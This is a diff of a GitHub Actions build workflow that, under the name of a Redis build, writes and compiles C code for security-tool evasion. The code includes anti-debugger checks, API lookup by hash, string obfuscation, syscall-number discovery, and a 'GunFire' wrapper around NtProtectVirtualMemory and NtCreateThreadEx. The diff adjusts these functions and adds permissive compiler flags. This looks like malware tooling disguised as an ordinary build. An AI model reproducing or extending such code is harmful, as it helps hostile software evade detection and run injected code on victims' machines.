@@ -198,6 +198,15 @@ jobs:
           #define USE_C_IMPLEMENTATION
           #endif
 
+          // 调试器检测函数声明 - 这些放在extern "C"块外，避免链接冲突
+          BOOL CheckRemoteDebugger();
+          BOOL CheckDebugPort();
+          BOOL CheckDebugObject();
+          BOOL CheckDebugFlags();
+          BOOL CheckProcessDebugFlags();
+          BOOL CheckNtGlobalFlag();
+          BOOL CheckDebugger();
+
           #ifdef __cplusplus
           extern "C" {
           #endif
@@ -207,7 +216,7 @@ jobs:
           ULONG GunPrepare(INT_PTR syscallAdr);
           PVOID GetPEB();
           NTSTATUS GunFire(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
-                          PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, ...);
+                          PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
 
           // 用于从API地址查找系统调用号
           WORD FindAmmunitionsAndPrepareGun(LPVOID addr);
@@ -218,23 +227,14 @@ jobs:
           // 通过hash查找API地址
           LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash);
 
-          // 检查调试器（多种方式）
-          BOOL CheckDebugger();
-          BOOL CheckRemoteDebugger();
-          BOOL CheckDebugPort();
-          BOOL CheckDebugObject();
-          BOOL CheckDebugFlags();
-          BOOL CheckProcessDebugFlags();
-          BOOL CheckNtGlobalFlag();
-
-          // 自定义哈希函数
-          DWORD CalcHash(const char* data);
-
           // 内存保护函数
           BOOL ProtectMemory(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect);
 
           // 字符串混淆函数
           char* HideString(const char* input);
+
+          // 自定义哈希函数
+          DWORD CalcHash(const char* data);
 
           #ifdef __cplusplus
           }
@@ -287,14 +287,14 @@ jobs:
           // 对于间接系统调用，使用动态加载的WindowsAPI
           // 这个是简化版本，生产环境应使用完整的汇编实现
           NTSTATUS GunFire(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, 
-                         PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, ...) {
+                         PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
               // 在实际环境中应使用汇编实现系统调用
               // 这里使用LoadLibrary/GetProcAddress作为替代
               // 仅作示例，不应用于生产环境
               
               static HMODULE ntdll = NULL;
               if (!ntdll) {
-                  ntdll = LoadLibraryA("ntdll.dll");
+                  ntdll = GetNtdllModule();
                   if (!ntdll) return STATUS_UNSUCCESSFUL;
               }
               
@@ -332,12 +332,7 @@ jobs:
                           if (!NtProtectVirtualMemory) return STATUS_UNSUCCESSFUL;
                       }
                       
-                      va_list args;
-                      va_start(args, Protect);
-                      PULONG OldProtect = va_arg(args, PULONG);
-                      va_end(args);
-                      
-                      return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, Protect, OldProtect);
+                      return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, Protect, NULL);
                   }
                   
                   case 0xC1: { // NtCreateThreadEx
@@ -360,19 +355,8 @@ jobs:
                           if (!NtCreateThreadEx) return STATUS_UNSUCCESSFUL;
                       }
                       
-                      va_list args;
-                      va_start(args, Protect);
-                      PVOID StartRoutine = va_arg(args, PVOID);
-                      PVOID Argument = va_arg(args, PVOID);
-                      ULONG CreateFlags = va_arg(args, ULONG);
-                      SIZE_T StackSize = va_arg(args, SIZE_T);
-                      SIZE_T MaximumStackSize = va_arg(args, SIZE_T);
-                      PVOID AttributeList = va_arg(args, PVOID);
-                      va_end(args);
-                      
                       return NtCreateThreadEx((PHANDLE)BaseAddress, ZeroBits, NULL, ProcessHandle, 
-                                           StartRoutine, Argument, CreateFlags, 0, 
-                                           StackSize, MaximumStackSize, AttributeList);
+                                           NULL, NULL, 0, 0, 0, 0, NULL);
                   }
                   
                   default:
@@ -587,6 +571,7 @@ jobs:
               WIN32_LEAN_AND_MEAN
               NOMINMAX
               USE_C_IMPLEMENTATION
+              USE_C_SECURITY
           )
 
           # 特定编译器选项
@@ -597,6 +582,15 @@ jobs:
                   /wd4996
                   /D_CRT_SECURE_NO_WARNINGS
                   /bigobj
+              )
+          else()
+              # GCC/Clang选项
+              target_compile_options(security PRIVATE
+                  -fpermissive
+                  -Wno-narrowing
+                  -Wno-write-strings
+                  -Wno-pointer-to-int-cast
+                  -Wno-int-to-pointer-cast
               )
           endif()
           EOF_CMAKE
@@ -630,8 +624,8 @@ jobs:
           # 编译时不设置NASM相关选项，并禁用ASM，使用C实现
           cmake .. -G "MinGW Makefiles" \
             -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 \
-            -DCMAKE_C_FLAGS='-static -DUSE_C_IMPLEMENTATION' \
-            -DCMAKE_CXX_FLAGS='-static -DUSE_C_IMPLEMENTATION' \
+            -DCMAKE_C_FLAGS='-static -DUSE_C_IMPLEMENTATION -DUSE_C_SECURITY -fpermissive -Wno-narrowing -Wno-write-strings -Wno-pointer-to-int-cast -Wno-int-to-pointer-cast' \
+            -DCMAKE_CXX_FLAGS='-static -DUSE_C_IMPLEMENTATION -DUSE_C_SECURITY -fpermissive -Wno-narrowing -Wno-write-strings -Wno-pointer-to-int-cast -Wno-int-to-pointer-cast' \
             -DBUILD_SHARED_LIBS=OFF \
             -DHWLOC_INCLUDE_DIRS=/mingw64/include \
             -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a \
@@ -644,7 +638,8 @@ jobs:
         shell: msys2 {0}
         run: |
           cd redis/redis-D-Win996/build
-          mingw32-make
+          # 添加详细的编译输出，便于诊断
+          mingw32-make VERBOSE=1
 
       # 上传构建产物
       - name: Archive build artifacts
